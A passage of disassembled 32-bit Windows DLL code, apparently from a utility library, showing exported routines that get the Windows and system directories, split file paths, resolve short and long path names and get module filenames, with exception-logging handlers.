		call	sub_6AF3789B
		lea	ecx, [esi+34h]
		call	sub_6AF3789B
		lea	ecx, [esi+30h]
		call	sub_6AF3789B
		lea	ecx, [esi+2Ch]
		call	sub_6AF3789B
		lea	ecx, [esi+28h]
		call	sub_6AF3789B
		lea	ecx, [esi+24h]
		call	sub_6AF3789B
		lea	ecx, [esi+20h]
		call	sub_6AF3789B
		lea	ecx, [esi+1Ch]
		call	sub_6AF3789B
		lea	ecx, [esi+18h]
		call	sub_6AF3789B
		lea	ecx, [esi+14h]
		call	sub_6AF3789B
		lea	ecx, [esi+10h]
		call	sub_6AF3789B
		lea	ecx, [esi+0Ch]
		call	sub_6AF3789B
		lea	ecx, [esi+8]
		call	sub_6AF3789B
		lea	ecx, [esi+4]
		pop	esi
		jmp	sub_6AF3789B
Ordinal1164	endp

; Exported entry 1163.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal1163
Ordinal1163	proc near		; CODE XREF: Ordinal148+D7p
					; Ordinal562+5Bp ...
		push	esi
		mov	esi, ecx
		lea	ecx, [esi+4]
		mov	dword ptr [esi], offset	off_6AF5EFF0
		call	sub_6AF318C3
		lea	ecx, [esi+8]
		call	sub_6AF318C3
		lea	ecx, [esi+0Ch]
		call	sub_6AF318C3
		lea	ecx, [esi+10h]
		call	sub_6AF318C3
		lea	ecx, [esi+14h]
		call	sub_6AF318C3
		lea	ecx, [esi+18h]
		call	sub_6AF318C3
		lea	ecx, [esi+1Ch]
		call	sub_6AF318C3
		lea	ecx, [esi+20h]
		call	sub_6AF318C3
		lea	ecx, [esi+24h]
		call	sub_6AF318C3
		lea	ecx, [esi+28h]
		call	sub_6AF318C3
		lea	ecx, [esi+2Ch]
		call	sub_6AF318C3
		lea	ecx, [esi+30h]
		call	sub_6AF318C3
		lea	ecx, [esi+34h]
		call	sub_6AF318C3
		lea	ecx, [esi+38h]
		call	sub_6AF318C3
		lea	ecx, [esi+3Ch]
		call	sub_6AF318C3
		lea	ecx, [esi+40h]
		call	sub_6AF318C3
		mov	eax, esi
		pop	esi
		retn
Ordinal1163	endp


; =============== S U B	R O U T	I N E =======================================


; int __thiscall sub_6AF4AF83(void *, char)
sub_6AF4AF83	proc near		; DATA XREF: .rdata:off_6AF5EFF0o

arg_0		= byte ptr  4

		push	esi
		mov	esi, ecx
		call	Ordinal1164
		test	[esp+4+arg_0], 1
		jz	short loc_6AF4AF99
		push	esi		; void *
		call	??3@YAXPAX@Z	; operator delete(void *)
		pop	ecx

loc_6AF4AF99:				; CODE XREF: sub_6AF4AF83+Dj
		mov	eax, esi
		pop	esi
		retn	4
sub_6AF4AF83	endp


; =============== S U B	R O U T	I N E =======================================


sub_6AF4AF9F	proc near		; CODE XREF: Ordinal1166+44p

arg_0		= dword	ptr  4

		push	esi
		push	edi
		push	[esp+8+arg_0]
		mov	esi, ecx
		call	sub_6AF31911
		push	[esp+8+arg_0]
		mov	ecx, esi
		mov	edi, eax
		call	sub_6AF3155D
		mov	eax, edi
		pop	edi
		pop	esi
		retn	4
sub_6AF4AF9F	endp

; Exported entry 1184.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal1184
Ordinal1184	proc near		; DATA XREF: .rdata:off_6AF66098o

var_48		= byte ptr -48h
var_28		= dword	ptr -28h
var_14		= dword	ptr -14h
var_10		= dword	ptr -10h
var_C		= dword	ptr -0Ch
var_4		= dword	ptr -4
arg_0		= dword	ptr  8

		mov	eax, offset unknown_libname_104	; Microsoft VisualC 2-10/net runtime
		call	__EH_prolog
		sub	esp, 44h
		mov	eax, ___security_cookie
		push	ebx
		push	esi
		push	edi
		mov	[ebp+var_10], esp
		push	offset aCinstalleda_21 ; "CInstalledApps::GetWindowsDirectory()"
		lea	ecx, [ebp+var_48]
		mov	[ebp+var_14], eax
		call	Ordinal751
		and	[ebp+var_4], 0
		mov	ecx, [ebp+arg_0]
		mov	esi, 104h
		push	esi
		mov	[ebp+var_28], 1
		mov	byte ptr [ebp+var_4], 1
		call	sub_6AF31911
		push	esi		; uSize
		push	eax		; lpBuffer
		call	ds:GetWindowsDirectoryA
		mov	ecx, [ebp+arg_0]
		push	0FFFFFFFFh
		mov	edi, eax
		call	sub_6AF3531D
		test	edi, edi
		jz	short loc_6AF4B021
		cmp	edi, esi
		jbe	short loc_6AF4B038

loc_6AF4B021:				; CODE XREF: Ordinal1184+5Bj
		call	ds:GetLastError
		push	eax		; Args
		push	offset aCinstalleda_19 ; "CInstalledApps::GetWindowsDirectory()	:"...
		call	sub_6AF3102E
		and	[ebp+var_28], 0
		pop	ecx
		pop	ecx

loc_6AF4B038:				; CODE XREF: Ordinal1184+5Fj
					; DATA XREF: sub_6AF4B06A+3Do ...
		lea	ecx, [ebp+var_48]
		call	Ordinal753
		test	eax, eax
		jz	short loc_6AF4B048
		and	[ebp+var_28], 0

loc_6AF4B048:				; CODE XREF: Ordinal1184+82j
		lea	ecx, [ebp+var_48]
		call	Ordinal752
		mov	ecx, [ebp+var_C]
		mov	eax, [ebp+var_28]
		mov	large fs:0, ecx
		mov	ecx, [ebp+var_14]
		call	unknown_libname_15 ; Microsoft VisualC 2-10/net	runtime
		pop	edi
		pop	esi
		pop	ebx
		leave
		retn
Ordinal1184	endp


; =============== S U B	R O U T	I N E =======================================


sub_6AF4B06A	proc near		; DATA XREF: .rdata:6AF63D08o
		push	13h
		lea	ecx, [ebp-48h]
		call	Ordinal649
		push	offset aStdBad_alloc ; "std::bad_alloc"
		lea	ecx, [ebp-48h]
		call	Ordinal762
		mov	ecx, [ebp-50h]
		mov	eax, [ecx]
		call	dword ptr [eax+4]
		push	eax		; Src
		lea	ecx, [ebp-48h]
		call	Ordinal764
		lea	ecx, [ebp-48h]
		call	Ordinal767
		push	eax		; Args
		push	offset aCccatchS ; "CCCATCH : %s\n"
		call	sub_6AF3102E
		pop	ecx
		pop	ecx
		mov	eax, offset loc_6AF4B038
		retn
sub_6AF4B06A	endp


; =============== S U B	R O U T	I N E =======================================


sub_6AF4B0AD	proc near		; DATA XREF: .rdata:6AF63D18o
		push	15h
		lea	ecx, [ebp-48h]
		call	Ordinal649
		push	offset aCatlexception ;	"CAtlException"
		lea	ecx, [ebp-48h]
		call	Ordinal762
		mov	eax, [ebp-4Ch]
		push	dword ptr [eax]
		lea	eax, [ebp-24h]
		push	offset a0x08x	; "0x%08X"
		push	eax		; LPSTR
		call	ds:wsprintfA
		add	esp, 0Ch
		lea	eax, [ebp-24h]
		push	eax		; Src
		lea	ecx, [ebp-48h]
		call	Ordinal764
		lea	ecx, [ebp-48h]
		call	Ordinal767
		push	eax		; Args
		push	offset aCccatchS ; "CCCATCH : %s\n"
		call	sub_6AF3102E
		pop	ecx
		pop	ecx
		mov	eax, offset loc_6AF4B038
		retn
sub_6AF4B0AD	endp

; Exported entry 1186.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal1186
Ordinal1186	proc near		; DATA XREF: .rdata:off_6AF66098o

var_48		= byte ptr -48h
var_28		= dword	ptr -28h
var_14		= dword	ptr -14h
var_10		= dword	ptr -10h
var_C		= dword	ptr -0Ch
var_4		= dword	ptr -4
arg_0		= dword	ptr  8

		mov	eax, offset unknown_libname_105	; Microsoft VisualC 2-10/net runtime
		call	__EH_prolog
		sub	esp, 44h
		mov	eax, ___security_cookie
		push	ebx
		push	esi
		push	edi
		mov	[ebp+var_10], esp
		push	offset aCinstalleda_22 ; "CInstalledApps::GetSystemDirectory()"
		lea	ecx, [ebp+var_48]
		mov	[ebp+var_14], eax
		call	Ordinal751
		and	[ebp+var_4], 0
		mov	ecx, [ebp+arg_0]
		mov	esi, 104h
		push	esi
		mov	[ebp+var_28], 1
		mov	byte ptr [ebp+var_4], 1
		call	sub_6AF31911
		push	esi		; uSize
		push	eax		; lpBuffer
		call	ds:GetSystemDirectoryA
		mov	ecx, [ebp+arg_0]
		push	0FFFFFFFFh
		mov	edi, eax
		call	sub_6AF3531D
		test	edi, edi
		jz	short loc_6AF4B163
		cmp	edi, esi
		jbe	short loc_6AF4B17A

loc_6AF4B163:				; CODE XREF: Ordinal1186+5Bj
		call	ds:GetLastError
		push	eax		; Args
		push	offset aCinstalleda_20 ; "CInstalledApps::GetSystemDirectory() : "...
		call	sub_6AF3102E
		and	[ebp+var_28], 0
		pop	ecx
		pop	ecx

loc_6AF4B17A:				; CODE XREF: Ordinal1186+5Fj
					; DATA XREF: sub_6AF4B1AC+3Do ...
		lea	ecx, [ebp+var_48]
		call	Ordinal753
		test	eax, eax
		jz	short loc_6AF4B18A
		and	[ebp+var_28], 0

loc_6AF4B18A:				; CODE XREF: Ordinal1186+82j
		lea	ecx, [ebp+var_48]
		call	Ordinal752
		mov	ecx, [ebp+var_C]
		mov	eax, [ebp+var_28]
		mov	large fs:0, ecx
		mov	ecx, [ebp+var_14]
		call	unknown_libname_15 ; Microsoft VisualC 2-10/net	runtime
		pop	edi
		pop	esi
		pop	ebx
		leave
		retn
Ordinal1186	endp


; =============== S U B	R O U T	I N E =======================================


sub_6AF4B1AC	proc near		; DATA XREF: .rdata:6AF63D70o
		push	13h
		lea	ecx, [ebp-48h]
		call	Ordinal649
		push	offset aStdBad_alloc ; "std::bad_alloc"
		lea	ecx, [ebp-48h]
		call	Ordinal762
		mov	ecx, [ebp-50h]
		mov	eax, [ecx]
		call	dword ptr [eax+4]
		push	eax		; Src
		lea	ecx, [ebp-48h]
		call	Ordinal764
		lea	ecx, [ebp-48h]
		call	Ordinal767
		push	eax		; Args
		push	offset aCccatchS ; "CCCATCH : %s\n"
		call	sub_6AF3102E
		pop	ecx
		pop	ecx
		mov	eax, offset loc_6AF4B17A
		retn
sub_6AF4B1AC	endp


; =============== S U B	R O U T	I N E =======================================


sub_6AF4B1EF	proc near		; DATA XREF: .rdata:6AF63D80o
		push	15h
		lea	ecx, [ebp-48h]
		call	Ordinal649
		push	offset aCatlexception ;	"CAtlException"
		lea	ecx, [ebp-48h]
		call	Ordinal762
		mov	eax, [ebp-4Ch]
		push	dword ptr [eax]
		lea	eax, [ebp-24h]
		push	offset a0x08x	; "0x%08X"
		push	eax		; LPSTR
		call	ds:wsprintfA
		add	esp, 0Ch
		lea	eax, [ebp-24h]
		push	eax		; Src
		lea	ecx, [ebp-48h]
		call	Ordinal764
		lea	ecx, [ebp-48h]
		call	Ordinal767
		push	eax		; Args
		push	offset aCccatchS ; "CCCATCH : %s\n"
		call	sub_6AF3102E
		pop	ecx
		pop	ecx
		mov	eax, offset loc_6AF4B17A
		retn
sub_6AF4B1EF	endp

; Exported entry 1165.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __stdcall	Ordinal1165(LPCSTR Filename)
		public Ordinal1165
Ordinal1165	proc near		; CODE XREF: Ordinal148+E7p
					; Ordinal562+6Bp ...

var_90		= dword	ptr -90h
var_8C		= dword	ptr -8Ch
var_88		= byte ptr -88h
Dir		= dword	ptr -68h
var_64		= dword	ptr -64h
Drive		= dword	ptr -60h
var_5C		= dword	ptr -5Ch
var_58		= dword	ptr -58h
var_54		= dword	ptr -54h
var_50		= dword	ptr -50h
var_4C		= dword	ptr -4Ch
var_48		= dword	ptr -48h
var_44		= dword	ptr -44h
var_40		= dword	ptr -40h
var_3C		= dword	ptr -3Ch
var_38		= dword	ptr -38h
var_34		= dword	ptr -34h
Filename	= dword	ptr -30h
FullPath	= dword	ptr -2Ch
lpszLongPath	= dword	ptr -28h
var_24		= byte ptr -24h
var_14		= dword	ptr -14h
var_10		= dword	ptr -10h
var_C		= dword	ptr -0Ch
var_4		= dword	ptr -4
Src		= dword	ptr  8

		mov	eax, offset unknown_libname_106	; Microsoft VisualC 2-10/net runtime
		call	__EH_prolog
		sub	esp, 84h
		mov	eax, ___security_cookie
		push	ebx
		push	esi
		push	edi
		xor	edi, edi
		cmp	[ebp+Src], edi
		mov	[ebp+var_14], eax
		mov	[ebp+var_10], esp
		mov	esi, ecx
		jz	loc_6AF4B6A3
		push	[ebp+Src]	; lpString
		call	ds:lstrlenA
		test	eax, eax
		jz	loc_6AF4B6A3
		push	offset aCsplitpathSpli ; "CSplitPath::SplitPath()"
		lea	ecx, [ebp+var_88]
		call	Ordinal751
		mov	[ebp+var_4], edi
		lea	edi, [esi+4]
		mov	ecx, edi
		mov	byte ptr [ebp+var_4], 1
		call	sub_6AF317A8
		lea	ebx, [esi+8]
		mov	ecx, ebx
		call	sub_6AF317A8
		lea	ecx, [esi+0Ch]
		mov	[ebp+var_58], ecx
		call	sub_6AF317A8
		lea	ecx, [esi+10h]
		mov	[ebp+lpszLongPath], ecx
		call	sub_6AF317A8
		lea	ecx, [esi+14h]
		mov	[ebp+var_50], ecx
		call	sub_6AF317A8
		lea	ecx, [esi+18h]
		mov	[ebp+var_40], ecx
		call	sub_6AF317A8
		lea	ecx, [esi+1Ch]
		mov	[ebp+var_34], ecx
		call	sub_6AF317A8
		lea	ecx, [esi+20h]
		mov	[ebp+var_5C], ecx
		call	sub_6AF317A8
		lea	ecx, [esi+24h]
		mov	[ebp+var_64], ecx
		call	sub_6AF317A8
		lea	ecx, [esi+28h]
		mov	[ebp+var_3C], ecx
		call	sub_6AF317A8
		lea	ecx, [esi+2Ch]
		mov	[ebp+var_48], ecx
		call	sub_6AF317A8
		lea	ecx, [esi+30h]
		mov	[ebp+Filename],	ecx
		call	sub_6AF317A8
		lea	ecx, [esi+34h]
		mov	[ebp+var_44], ecx
		call	sub_6AF317A8
		lea	ecx, [esi+38h]
		mov	[ebp+var_38], ecx
		call	sub_6AF317A8
		lea	ecx, [esi+3Ch]
		mov	[ebp+var_4C], ecx
		call	sub_6AF317A8
		lea	ecx, [esi+40h]
		mov	[ebp+var_54], ecx
		call	sub_6AF317A8
		push	[ebp+Src]	; Src
		mov	ecx, edi
		call	sub_6AF31B1D
		mov	eax, [edi]
		mov	esi, [eax-0Ch]
		mov	ecx, [ebp+var_50]
		push	esi
		call	sub_6AF31911
		mov	ecx, [ebp+var_58]
		push	esi
		mov	[ebp+Src], eax
		call	sub_6AF31911
		push	esi
		mov	ecx, ebx
		mov	[ebp+Dir], eax
		call	sub_6AF31911
		mov	ecx, [ebp+var_40]
		mov	[ebp+Drive], eax
		mov	eax, [edi]
		push	esi
		mov	[ebp+FullPath],	eax
		call	sub_6AF31911
		push	eax		; Ext
		push	[ebp+Src]	; Filename
		push	[ebp+Dir]	; Dir
		push	[ebp+Drive]	; Drive
		push	[ebp+FullPath]	; FullPath
		call	ds:_splitpath
		add	esp, 14h
		push	0FFFFFFFFh
		mov	ecx, ebx
		call	sub_6AF3531D
		mov	esi, [ebp+var_58]
		push	0FFFFFFFFh
		mov	ecx, esi
		call	sub_6AF3531D
		mov	ecx, [ebp+var_50]
		push	0FFFFFFFFh
		call	sub_6AF3531D
		mov	ecx, [ebp+var_40]
		push	0FFFFFFFFh
		call	sub_6AF3531D
		mov	eax, [esi]
		mov	ebx, [ebx]
		push	eax
		push	ebx		; Args
		push	offset aSS_0	; "%s%s"
		push	[ebp+lpszLongPath] ; int
		call	sub_6AF3217C
		add	esp, 10h
		push	dword ptr [edi]	; lpFileName
		call	ds:GetFileAttributesA
		cmp	eax, 0FFFFFFFFh
		jz	loc_6AF4B509
		mov	eax, [edi]
		mov	ebx, ds:GetShortPathNameA
		push	0		; cchBuffer
		push	0		; lpszShortPath
		push	eax		; lpszLongPath
		call	ebx ; GetShortPathNameA
		test	eax, eax
		mov	[ebp+Src], eax
		jnz	short loc_6AF4B419

loc_6AF4B401:				; CODE XREF: Ordinal1165+1FBj
		call	ds:GetLastError
		push	eax		; Args
		push	offset aCsplitpathSp_0 ; "CSplitPath::SplitPath() : GetShortPathN"...
		call	sub_6AF3102E
		pop	ecx
		pop	ecx
		jmp	loc_6AF4B4E0
; ---------------------------------------------------------------------------

loc_6AF4B419:				; CODE XREF: Ordinal1165+1BBj
		mov	ecx, [edi]
		mov	esi, [ebp+Filename]
		mov	[ebp+lpszLongPath], ecx
		push	eax
		mov	ecx, esi
		call	sub_6AF31911
		push	[ebp+Src]	; cchBuffer
		push	eax		; lpszShortPath
		push	[ebp+lpszLongPath] ; lpszLongPath
		call	ebx ; GetShortPathNameA
		push	0FFFFFFFFh
		mov	ecx, esi
		mov	ebx, eax
		call	sub_6AF3531D
		test	ebx, ebx
		jz	short loc_6AF4B401
		lea	ecx, [ebp+Src]
		call	sub_6AF318C3
		mov	eax, [esi]
		mov	ebx, [eax-0Ch]
		mov	ecx, [ebp+var_4C]
		push	ebx
		mov	byte ptr [ebp+var_4], 2
		call	sub_6AF31911
		mov	ecx, [ebp+var_44]
		push	ebx
		mov	[ebp+Filename],	eax
		call	sub_6AF31911
		push	ebx
		lea	ecx, [ebp+Src]
		mov	[ebp+lpszLongPath], eax
		call	sub_6AF31911
		mov	ecx, [ebp+var_54]
		mov	esi, [esi]
		push	ebx
		mov	[ebp+FullPath],	eax
		call	sub_6AF31911
		push	eax		; Ext
		push	[ebp+Filename]	; Filename
		push	[ebp+lpszLongPath] ; Dir
		push	[ebp+FullPath]	; Drive
		push	esi		; FullPath
		call	ds:_splitpath
		add	esp, 14h
		or	esi, 0FFFFFFFFh
		push	esi
		lea	ecx, [ebp+Src]
		call	sub_6AF3531D
		mov	ebx, [ebp+var_44]
		push	esi
		mov	ecx, ebx
		call	sub_6AF3531D
		mov	ecx, [ebp+var_4C]
		push	esi
		call	sub_6AF3531D
		mov	ecx, [ebp+var_54]
		push	esi
		call	sub_6AF3531D
		push	dword ptr [ebx]
		mov	esi, [ebp+Src]
		push	esi		; Args
		push	offset aSS_0	; "%s%s"
		push	[ebp+var_38]	; int
		call	sub_6AF3217C
		add	esp, 10h
		lea	ecx, [esi-10h]
		mov	byte ptr [ebp+var_4], 1
		call	sub_6AF3160D

loc_6AF4B4E0:				; CODE XREF: Ordinal1165+1D0j
		mov	eax, [edi]
		mov	ebx, ds:GetLongPathNameA
		push	0		; cchBuffer
		push	0		; lpszLongPath
		push	eax		; lpszShortPath
		call	ebx ; GetLongPathNameA
		test	eax, eax
		mov	[ebp+Src], eax
		jnz	short loc_6AF4B52D

loc_6AF4B4F6:				; CODE XREF: Ordinal1165+30Aj
		call	ds:GetLastError
		push	eax		; Args
		push	offset aCsplitpathSp_1 ; "CSplitPath::SplitPath() : GetLongPathNa"...
		call	sub_6AF3102E
		pop	ecx
		pop	ecx

loc_6AF4B509:				; CODE XREF: Ordinal1165+1A1j
					; Ordinal1165+3A4j
					; DATA XREF: ...
		lea	ecx, [ebp+var_88]
		call	Ordinal753
		mov	esi, eax
		neg	esi
		sbb	esi, esi
		lea	ecx, [ebp+var_88]
		inc	esi
		call	Ordinal752
		mov	eax, esi
		jmp	loc_6AF4B6AB
; ---------------------------------------------------------------------------

loc_6AF4B52D:				; CODE XREF: Ordinal1165+2B0j
		mov	esi, [edi]
		mov	edi, [ebp+var_34]
		push	eax
		mov	ecx, edi
		call	sub_6AF31911
		push	[ebp+Src]	; cchBuffer
		push	eax		; lpszLongPath
		push	esi		; lpszShortPath
		call	ebx ; GetLongPathNameA
		push	0FFFFFFFFh
		mov	ecx, edi
		mov	ebx, eax
		call	sub_6AF3531D
		test	ebx, ebx
		jz	short loc_6AF4B4F6
		lea	ecx, [ebp+Src]
		call	sub_6AF318C3
		mov	eax, [edi]
		mov	ebx, [eax-0Ch]
		mov	ecx, [ebp+var_3C]
		push	ebx
		mov	byte ptr [ebp+var_4], 3
		call	sub_6AF31911
		mov	ecx, [ebp+var_5C]
		push	ebx
		mov	[ebp+var_34], eax
		call	sub_6AF31911
		push	ebx
		lea	ecx, [ebp+Src]
		mov	[ebp+var_38], eax
		call	sub_6AF31911
		mov	ecx, [ebp+var_48]
		mov	edi, [edi]
		push	ebx
		mov	esi, eax
		call	sub_6AF31911
		push	eax		; Ext
		push	[ebp+var_34]	; Filename
		push	[ebp+var_38]	; Dir
		push	esi		; Drive
		push	edi		; FullPath
		call	ds:_splitpath
		add	esp, 14h
		or	esi, 0FFFFFFFFh
		push	esi
		lea	ecx, [ebp+Src]
		call	sub_6AF3531D
		mov	edi, [ebp+var_5C]
		push	esi
		mov	ecx, edi
		call	sub_6AF3531D
		mov	ecx, [ebp+var_3C]
		push	esi
		call	sub_6AF3531D
		mov	ecx, [ebp+var_48]
		push	esi
		call	sub_6AF3531D
		push	dword ptr [edi]
		mov	esi, [ebp+Src]
		push	esi		; Args
		push	offset aSS_0	; "%s%s"
		push	[ebp+var_64]	; int
		call	sub_6AF3217C
		add	esp, 10h
		lea	ecx, [esi-10h]
		call	sub_6AF3160D
		jmp	loc_6AF4B509
; ---------------------------------------------------------------------------

loc_6AF4B5ED:				; DATA XREF: .rdata:6AF63DE8o
		push	13h
		lea	ecx, [ebp+var_88]
		call	Ordinal649
		push	offset aStdBad_alloc ; "std::bad_alloc"
		lea	ecx, [ebp+var_88]
		call	Ordinal762
		mov	ecx, [ebp+var_90]
		mov	eax, [ecx]
		call	dword ptr [eax+4]
		push	eax		; Src
		lea	ecx, [ebp+var_88]
		call	Ordinal764
		lea	ecx, [ebp+var_88]
		call	Ordinal767
		push	eax		; Args
		push	offset aCccatchS ; "CCCATCH : %s\n"
		call	sub_6AF3102E
		pop	ecx
		pop	ecx
		mov	eax, offset loc_6AF4B509
		retn
; ---------------------------------------------------------------------------

loc_6AF4B63F:				; DATA XREF: .rdata:6AF63DF8o
		push	15h
		lea	ecx, [ebp+var_88]
		call	Ordinal649
		push	offset aCatlexception ;	"CAtlException"
		lea	ecx, [ebp+var_88]
		call	Ordinal762
		mov	eax, [ebp+var_8C]
		push	dword ptr [eax]
		lea	eax, [ebp+var_24]
		push	offset a0x08x	; "0x%08X"
		push	eax		; LPSTR
		call	ds:wsprintfA
		add	esp, 0Ch
		lea	eax, [ebp+var_24]
		push	eax		; Src
		lea	ecx, [ebp+var_88]
		call	Ordinal764
		lea	ecx, [ebp+var_88]
		call	Ordinal767
		push	eax		; Args
		push	offset aCccatchS ; "CCCATCH : %s\n"
		call	sub_6AF3102E
		pop	ecx
		pop	ecx
		mov	eax, offset loc_6AF4B509
		retn
; ---------------------------------------------------------------------------

loc_6AF4B6A3:				; CODE XREF: Ordinal1165+25j
					; Ordinal1165+36j
		push	edi		; hModule
		mov	ecx, esi
		call	Ordinal1166

loc_6AF4B6AB:				; CODE XREF: Ordinal1165+2E4j
		mov	ecx, [ebp+var_C]
		mov	large fs:0, ecx
		mov	ecx, [ebp+var_14]
		call	unknown_libname_15 ; Microsoft VisualC 2-10/net	runtime
		pop	edi
		pop	esi
		pop	ebx
		leave
		retn	4
Ordinal1165	endp ; sp-analysis failed

; Exported entry 1166.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __stdcall	Ordinal1166(HMODULE hModule)
		public Ordinal1166
Ordinal1166	proc near		; CODE XREF: Ordinal1165+462p
					; Ordinal1190+37p
					; DATA XREF: ...

var_54		= dword	ptr -54h
var_50		= dword	ptr -50h
var_4C		= byte ptr -4Ch
var_2C		= dword	ptr -2Ch
Filename	= dword	ptr -28h
Src		= byte ptr -24h
var_14		= dword	ptr -14h
var_10		= dword	ptr -10h
var_C		= dword	ptr -0Ch
var_4		= dword	ptr -4
hModule		= dword	ptr  8

		mov	eax, offset unknown_libname_107	; Microsoft VisualC 2-10/net runtime
		call	__EH_prolog
		sub	esp, 48h
		mov	eax, ___security_cookie
		push	ebx
		push	esi
		push	edi
		mov	[ebp+var_2C], ecx
		lea	ecx, [ebp+Filename]
		mov	[ebp+var_14], eax
		mov	[ebp+var_10], esp
		call	sub_6AF318C3
		and	[ebp+var_4], 0
		push	offset aCsplitpathSp_2 ; "CSplitPath::SplitModule()"
		lea	ecx, [ebp+var_4C]
		call	Ordinal751
		mov	byte ptr [ebp+var_4], 2
		mov	esi, 104h

loc_6AF4B704:				; CODE XREF: Ordinal1166+88j
		push	esi
		lea	ecx, [ebp+Filename]
		call	sub_6AF4AF9F
		push	esi		; nSize
		push	eax		; lpFilename
		push	[ebp+hModule]	; hModule
		call	ds:GetModuleFileNameA
		push	0FFFFFFFFh
		lea	ecx, [ebp+Filename]
		mov	edi, eax
		call	sub_6AF3531D
		test	edi, edi
		jnz	short loc_6AF4B742
		call	ds:GetLastError
		push	eax		; Args
		push	offset aCsplitpathSp_3 ; "CSplitPath::SplitModule() : GetModuleFi"...
		call	sub_6AF3102E
		pop	ecx
		pop	ecx

loc_6AF4B73B:				; CODE XREF: Ordinal1166+12Cj
		xor	esi, esi
		jmp	loc_6AF4B803
; ---------------------------------------------------------------------------

loc_6AF4B742:				; CODE XREF: Ordinal1166+62j
		cmp	edi, esi
		jnz	loc_6AF4B7E6
		add	esi, esi
		jmp	short loc_6AF4B704
; ---------------------------------------------------------------------------

loc_6AF4B74E:				; DATA XREF: .rdata:6AF63E58o
		push	13h
		lea	ecx, [ebp+var_4C]
		call	Ordinal649
		push	offset aStdBad_alloc ; "std::bad_alloc"
		lea	ecx, [ebp+var_4C]
		call	Ordinal762
		mov	ecx, [ebp+var_50]
		mov	eax, [ecx]
		call	dword ptr [eax+4]
		push	eax		; Src
		lea	ecx, [ebp+var_4C]
		call	Ordinal764
		lea	ecx, [ebp+var_4C]
		call	Ordinal767
		push	eax		; Args
		push	offset aCccatchS ; "CCCATCH : %s\n"
		call	sub_6AF3102E
		pop	ecx
		pop	ecx
		mov	eax, offset loc_6AF4B7E6
		retn
; ---------------------------------------------------------------------------

loc_6AF4B791:				; DATA XREF: .rdata:6AF63E68o
		push	15h
		lea	ecx, [ebp+var_4C]
		call	Ordinal649
		push	offset aCatlexception ;	"CAtlException"
		lea	ecx, [ebp+var_4C]
		call	Ordinal762
		mov	eax, [ebp+var_54]
		push	dword ptr [eax]
		lea	eax, [ebp+Src]
		push	offset a0x08x	; "0x%08X"
		push	eax		; LPSTR
		call	ds:wsprintfA
		add	esp, 0Ch
		lea	eax, [ebp+Src]
		push	eax		; Src
		lea	ecx, [ebp+var_4C]
		call	Ordinal764
		lea	ecx, [ebp+var_4C]
		call	Ordinal767
		push	eax		; Args
		push	offset aCccatchS ; "CCCATCH : %s\n"
		call	sub_6AF3102E
		pop	ecx
		pop	ecx
		mov	eax, offset loc_6AF4B7E6
		retn
; ---------------------------------------------------------------------------

loc_6AF4B7E6:				; CODE XREF: Ordinal1166+80j
					; DATA XREF: Ordinal1166+C7o ...
		lea	ecx, [ebp+var_4C]
		call	Ordinal753
		test	eax, eax
		jnz	loc_6AF4B73B
		push	[ebp+Filename]	; Filename
		mov	ecx, [ebp+var_2C]
		call	Ordinal1165
		mov	esi, eax

loc_6AF4B803:				; CODE XREF: Ordinal1166+79j
		lea	ecx, [ebp+var_4C]
		call	Ordinal752
		mov	ecx, [ebp+Filename]
		add	ecx, 0FFFFFFF0h
		call	sub_6AF3160D
		mov	ecx, [ebp+var_C]
		mov	large fs:0, ecx
		mov	ecx, [ebp+var_14]
		mov	eax, esi
		call	unknown_libname_15 ; Microsoft VisualC 2-10/net	runtime
		pop	edi
		pop	esi
		pop	ebx
		leave
		retn	4
Ordinal1166	endp ; sp-analysis failed

; Exported entry 1190.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __cdecl Ordinal1190(HMODULE hModule, int)
		public Ordinal1190
Ordinal1190	proc near		; CODE XREF: Ordinal1188+6p
					; Ordinal1189+14p
					; DATA XREF: ...

var_90		= byte ptr -90h
Src		= dword	ptr -80h
var_44		= byte ptr -44h
var_14		= dword	ptr -14h
var_10		= dword	ptr -10h
var_C		= dword	ptr -0Ch
var_4		= dword	ptr -4
Args		= dword	ptr  8
arg_4		= dword	ptr  0Ch

		mov	eax, offset unknown_libname_108	; Microsoft VisualC 2-10/net runtime
		call	__EH_prolog
		sub	esp, 84h
		mov	eax, ___security_cookie
		push	ebx
		push	esi
		push	edi
		lea	ecx, [ebp+var_90]
		mov	[ebp+var_14], eax
		mov	[ebp+var_10], esp
		call	Ordinal1163
		push	[ebp+Args]	; Args
		xor	esi, esi
		lea	ecx, [ebp+var_90]
		mov	[ebp+var_4], esi
		call	Ordinal1166
		test	eax, eax
		jnz	short loc_6AF4B87E
		push	offset aCsplitpathGetp ; "CSplitPath::GetProcessDirectory() : pat"...
		call	sub_6AF3102E
		pop	ecx
		jmp	short loc_6AF4B8B1
; ---------------------------------------------------------------------------

loc_6AF4B87E:				; CODE XREF: Ordinal1190+3Ej
		push	offset aCsplitpathGetm ; "CSplitPath::GetModuleDirectory()"
		lea	ecx, [ebp+var_44]
		call	Ordinal751
		push	[ebp+Src]	; Src
		mov	ecx, [ebp+arg_4]
		mov	byte ptr [ebp+var_4], 2
		call	sub_6AF31B1D

loc_6AF4B89A:				; DATA XREF: sub_6AF4B8D5+3Do
					; sub_6AF4B918+4Fo
		lea	ecx, [ebp+var_44]
		call	Ordinal753
		mov	esi, eax
		neg	esi
		sbb	esi, esi
		lea	ecx, [ebp+var_44]
		inc	esi
		call	Ordinal752

loc_6AF4B8B1:				; CODE XREF: Ordinal1190+4Bj
		lea	ecx, [ebp+var_90]
		call	Ordinal1164
		mov	ecx, [ebp+var_C]
		mov	large fs:0, ecx
		mov	ecx, [ebp+var_14]
		mov	eax, esi
		call	unknown_libname_15 ; Microsoft VisualC 2-10/net	runtime
		pop	edi
		pop	esi
		pop	ebx
		leave
		retn
Ordinal1190	endp ; sp-analysis failed


; =============== S U B	R O U T	I N E =======================================


sub_6AF4B8D5	proc near		; DATA XREF: .rdata:6AF63EC8o
		push	13h
		lea	ecx, [ebp-44h]
		call	Ordinal649
		push	offset aStdBad_alloc ; "std::bad_alloc"
		lea	ecx, [ebp-44h]
		call	Ordinal762
		mov	ecx, [ebp-48h]
		mov	eax, [ecx]
		call	dword ptr [eax+4]
		push	eax		; Src
